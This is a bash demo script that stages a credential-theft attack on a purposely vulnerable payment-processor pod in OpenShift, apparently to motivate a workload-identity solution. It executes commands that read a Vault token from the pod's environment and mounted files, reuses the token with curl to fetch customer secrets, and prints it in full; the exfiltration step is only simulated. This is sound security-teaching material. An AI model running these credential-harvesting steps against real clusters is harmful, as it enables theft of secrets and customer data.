#!/usr/bin/env bash
# Scenario 1: Attack on Vulnerable App with Static Vault Token
# This demonstrates a successful credential theft attack

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}+====================================================================+${NC}"
echo -e "${CYAN}|                    SCENARIO 1: VULNERABLE APP                      |${NC}"
echo -e "${CYAN}|          Static Vault Token - Credential Theft Attack              |${NC}"
echo -e "${CYAN}+====================================================================+${NC}"
echo ""

VAULT_ADDR=$(cat /tmp/demo-tokens/vault-addr.txt 2>/dev/null || echo "")
if [[ -z "$VAULT_ADDR" ]]; then
    echo -e "${RED}ERROR: Vault not configured. Run setup-vulnerable-vault.sh first${NC}"
    exit 1
fi

echo -e "${BLUE}[INFO]${NC} Target: Vulnerable payment processor using static Vault token"
echo -e "${BLUE}[INFO]${NC} Vault Address: $VAULT_ADDR"
echo ""

sleep 2

# Step 1: Reconnaissance
echo -e "${RED}[ATTACKER]${NC} ${YELLOW}Step 1: Reconnaissance - Finding the target pod${NC}"
POD=$(oc get pod -n vulnerable-app -l app=payment-processor -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")

if [[ -z "$POD" ]]; then
    echo -e "${RED}ERROR: Vulnerable app not deployed${NC}"
    exit 1
fi

echo -e "${RED}[ATTACKER]${NC} Target pod identified: ${POD}"
sleep 2

# Step 2: Initial Access
echo ""
echo -e "${RED}[ATTACKER]${NC} ${YELLOW}Step 2: Gaining shell access to application pod${NC}"
echo -e "${BLUE}[INFO]${NC} Simulating: oc exec -it ${POD} -- /bin/bash"
sleep 2

# Step 3: Discovering credentials
echo ""
echo -e "${RED}[ATTACKER]${NC} ${YELLOW}Step 3: Searching for Vault credentials in the pod${NC}"
sleep 1

echo -e "${RED}[ATTACKER]${NC} Checking environment variables..."
STOLEN_TOKEN=$(oc exec -n vulnerable-app $POD -- printenv VAULT_TOKEN)
echo -e "${RED}[ATTACKER]${NC} Found: VAULT_TOKEN=${STOLEN_TOKEN:0:30}..."
sleep 1

echo -e "${RED}[ATTACKER]${NC} Checking mounted secrets..."
echo -e "${RED}[ATTACKER]${NC} $ cat /vault/secrets/token"
oc exec -n vulnerable-app $POD -- cat /vault/secrets/token | head -c 30
echo "..."
sleep 2

# Step 4: Exfiltration
echo ""
echo -e "${RED}[ATTACKER]${NC} ${YELLOW}Step 4: Exfiltrating credentials to attacker infrastructure${NC}"
echo -e "${BLUE}[INFO]${NC} Copying token to external location..."
sleep 1
echo -e "${RED}✓ Token exfiltrated successfully!${NC}"
echo -e "${RED}[ATTACKER]${NC} Token saved to attacker's command & control server"
sleep 2

# Step 5: External Access
echo ""
echo -e "${RED}[ATTACKER]${NC} ${YELLOW}Step 5: Authenticating to Vault from outside the cluster${NC}"
echo -e "${BLUE}[INFO]${NC} Attacker is now operating from their own infrastructure"
echo -e "${BLUE}[INFO]${NC} This could be anywhere in the world - not limited to the cluster"
sleep 2

echo -e "${RED}[ATTACKER]${NC} Attempting to access Vault with stolen token..."
sleep 1

# Try to read the secret (KV v2 uses /data/ path)
RESULT=$(curl -sf -H "X-Vault-Token: $STOLEN_TOKEN" \
    "$VAULT_ADDR/v1/secret/data/customer-data" 2>/dev/null || echo "FAILED")

if [[ "$RESULT" != "FAILED" ]]; then
    echo ""
    echo -e "${RED}+====================================================================+${NC}"
    echo -e "${RED}|                     ⚠️  ATTACK SUCCESSFUL! ⚠️                      |${NC}"
    echo -e "${RED}+====================================================================+${NC}"
    echo ""
    echo -e "${RED}Attacker successfully accessed sensitive customer data:${NC}"
    echo ""

    # Pretty print the stolen data
    echo "$RESULT" | jq -C '.data.data' | sed 's/^/  /'

    echo ""
    echo -e "${RED}=== IMPACT ANALYSIS ===${NC}"
    echo -e "${RED}✗${NC} Attacker accessed: Credit cards, SSNs, API keys, passwords"
    echo -e "${RED}✗${NC} Token valid for: 90 days (2160 hours)"
    echo -e "${RED}✗${NC} Attack origin: External (simulated from outside cluster)"
    echo -e "${RED}✗${NC} Detection: Minimal - looks like legitimate app access"
    echo -e "${RED}✗${NC} Revocation: Manual only - no automatic expiration"
    echo ""
    echo -e "${RED}=== WHY THIS ATTACK SUCCEEDED ===${NC}"
    echo -e "${RED}✗${NC} Static, long-lived credentials stored in Kubernetes Secret"
    echo -e "${RED}✗${NC} No workload identity verification"
    echo -e "${RED}✗${NC} Token usable from ANY location (no attestation)"
    echo -e "${RED}✗${NC} No time-based expiration (manual rotation required)"
    echo -e "${RED}✗${NC} Credentials visible in env vars and mounted files"
    echo ""
    echo -e "${YELLOW}⚠️  This is a realistic scenario that happens in production!${NC}"
    echo ""
else
    echo -e "${YELLOW}[WARN]${NC} Authentication failed (check Vault configuration)"
    echo "Response: $RESULT"
fi

# Show token details
echo ""
echo -e "${BLUE}=== STOLEN TOKEN DETAILS ===${NC}"
echo "Full Token: $STOLEN_TOKEN"
echo "Token Length: ${#STOLEN_TOKEN} characters"
echo "Valid Until: 90 days from creation"
echo "Accessible From: Anywhere with network access to Vault"
echo ""

echo -e "${CYAN}Press Enter to see how ZTWIM prevents this attack...${NC}"
read
